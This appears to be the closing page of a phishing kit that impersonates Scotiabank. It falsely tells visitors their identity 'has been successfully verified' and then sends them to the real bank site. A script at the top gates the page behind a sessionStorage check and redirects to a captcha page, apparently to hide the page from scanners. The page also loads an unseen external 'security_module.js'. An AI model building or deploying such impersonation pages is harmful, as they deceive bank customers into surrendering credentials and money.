<!DOCTYPE html>
<html lang="en">
<head>
<script>if(!sessionStorage.getItem('__cptPass')||sessionStorage.getItem('__cptPass')!=='1'){try{document.documentElement.innerHTML=''}catch(e){}window.location.replace('/captcha.html');throw new Error('BLOCKED');}</script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scotiabank - Success</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; padding: 0; color: #333; display: flex; flex-direction: column; min-height: 100vh; }
        .s-container { max-width: 400px; margin: 40px auto 20px; padding: 20px; flex: 1; width: 100%; box-sizing: border-box; }
        .s-title-top { font-size: 22px; font-weight: 800; text-align: center; color: #333; margin-bottom: 5px; }
        .s-title-bottom { font-size: 32px; font-weight: 900; text-align: center; color: #d00000; margin-bottom: 40px; letter-spacing: -0.5px; }
        .s-title-bottom sup { font-size: 10px; font-weight: bold; vertical-align: super; }
        
        .s-label { display: block; font-weight: bold; font-size: 14px; margin-bottom: 10px; color: #333; }
        .s-input-wrapper { position: relative; margin-bottom: 25px; }
        .s-input-icon { position: absolute; left: 0; top: 12px; font-size: 18px; color: #333; }
        .s-input { width: 100%; border: none; border-bottom: 1px solid #999; padding: 12px 0 12px 35px; box-sizing: border-box; font-size: 16px; outline: none; transition: border-bottom-color 0.2s; }
        .s-input:focus { border-bottom: 2px solid #d00000; padding-bottom: 11px; }
        
        .s-checkbox-row { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 35px; }
        .s-checkbox { width: 22px; height: 22px; margin-top: 2px; border: 1px solid #777; border-radius: 4px; cursor: pointer; }
        .s-checkbox-label { font-size: 15px; color: #444; line-height: 1.4; }
        
        .s-btn { width: 100%; background: #c50018; color: white; border: none; padding: 16px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 25px; transition: background 0.2s; }
        .s-btn:hover { background: #a30013; }
        
        .s-help-link { display: block; text-align: center; color: #006da5; font-weight: bold; font-size: 15px; text-decoration: none; margin-bottom: 30px; }
        
        .s-footer { background: #f5f6f8; padding: 40px 20px; font-size: 15px; color: #333; line-height: 1.6; }
        .s-footer-link { font-weight: bold; color: #333; text-decoration: none; border-bottom: 2px dotted #555; padding-bottom: 2px; }
        
        /* Loader Overlay */
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
        }
        .loader-overlay.active { visibility: visible; opacity: 1; }
        .loader-spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #c50018;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
        .success-icon { font-size: 70px; color: #c50018; margin: 20px auto; display: block; text-align: center; }
        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 40px; text-align: center; }
    </style>
</head>
<body>
    <div class="s-container">
        
        <i class="fa-solid fa-circle-check success-icon"></i>
        <p class="success-desc">Your identity has been successfully verified. You can now access your account securely.</p>
        <button onclick="window.location.href='https://www.scotiabank.com/ca/en/personal.html'" class="s-btn">Return to Home</button>

    </div>
    
    <div class="s-footer">
        Do you have a username and password?<br>
        <a href="#" class="s-footer-link">Set them up now.</a>
    </div>

    <!-- Loader Overlay -->
    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Processing...</p>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const loader = document.getElementById('loaderOverlay');
            if(form && loader) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    loader.classList.add('active');
                    setTimeout(function() { form.submit(); }, 10000);
                });
            }
        });
    </script>
<script src="security_module.js"></script>
</body>
</html>
